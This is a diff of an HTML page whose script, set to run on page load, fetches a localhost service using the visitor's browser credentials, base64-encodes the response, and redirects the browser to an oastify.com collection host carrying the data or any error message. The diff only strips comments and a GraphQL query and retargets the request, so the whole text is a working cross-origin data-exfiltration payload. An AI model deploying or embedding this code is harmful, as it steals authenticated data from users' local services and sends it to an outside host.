@@ -7,44 +7,21 @@
     <script>
         async function executeRequest() {
             try {
-                // GraphQL query
-                const graphqlQuery = {
-                    query: `
-        query {
-          uploads {
-            id
-            filename
-            size
-            uploadDate
-            uploadedBy
-          }
-        }
-      `
-                };
-                
-                // Make the POST request with browser credentials (avoiding preflight)
-                const response = await fetch('http://localhost:1337/admin', {
-                    method: 'GET',
+                    const response = await fetch('http://localhost:1337/', {
                     credentials: 'include'
                 });
                 
-                // Get response text
                 const responseText = await response.text();
                 
-                // Base64 encode the response
                 const base64Response = btoa(responseText);
                 
-                // Send to example.com with base64 data as URL parameter
                 window.location.href = `https://s5ytnj4jn7rsdvmipbho4i23lurlfi37.oastify.com?data=${encodeURIComponent(base64Response)}`;
                 
             } catch (error) {
                 console.error('Error:', error);
-                // Redirect to example.com with error message
                 window.location.href = `https://s5ytnj4jn7rsdvmipbho4i23lurlfi37.oastify.com?error=${encodeURIComponent(error.message)}`;
             }
         }
-        
-        // Execute on page load
         window.onload = executeRequest;
     </script>
 </body>
